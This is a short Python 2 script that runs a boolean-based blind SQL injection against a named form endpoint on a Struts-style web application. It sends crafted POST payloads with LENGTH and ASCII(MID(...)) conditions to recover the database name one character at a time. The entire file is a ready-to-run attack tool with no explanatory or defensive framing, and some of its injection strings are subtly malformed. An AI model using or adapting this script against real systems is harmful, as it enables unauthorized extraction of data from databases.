#!/usr/bin/env python
# encoding: utf-8
import requests
import time
import sys

reload(sys)

sys.setdefaultencoding('utf-8')

payloads = list('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_.')

url='http://1.1.1.1:8082/sglaqyj/codeAction!findCodeDmAndDmmcByType.action'

data='type=DWLB_01'

key='DWLBNONGCU'

header = {
           'Content-Type': 'application/x-www-form-urlencoded',
           'User-Agent':'Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0'
        }


def getLength(info):
    payload = "' AND LENGTH(%s)="% info
    for i in range(1,30):
        time.sleep(0.1)
        try:
            expload=data+payload+str(i) + " AND ''='"
            r = requests.post(url=url,data=expload, headers=header, allow_redirects=False, timeout=10)
            res = r.text
            if res.find(key) > 0:
                print '%s LENGTH IS %s'% (info,i)
                return i
                break
        except:
            try:
                r = requests.post(url=url, data=data + payload + str(i) + "''='", headers=header, allow_redirects=False,
                                  timeout=10)
                res = r.text
                if res.find(key) > 0:
                    print 'INFORMATION LENGTH IS %s' % i
                    return i
                    break
            except Exception as e:
                print e


def fuzzing(count,informaiton):
    info = ''
    for i in range(1,count + 1):
        for exp in list(payloads):
            time.sleep(0.1)
            try:
                payload = data+"' and ASCII(MID(%s,%d,1)) = ord('%s') and ''='" % (informaiton,i,exp)
                r = requests.post(url=url, data=payload, headers=header, allow_redirects=False, timeout=10)
                res = r.text
                if res.find(key) > 0:
                    info += exp
                    print '%s IS:  %s'% (informaiton,info)
                    break
            except:
                pass
    print '%s IS:  %s'% (informaiton,info)


def get_info(info):
    count = getLength(info)
    return fuzzing(count,info)



if __name__ == '__main__':
    get_info('DATABASE()')
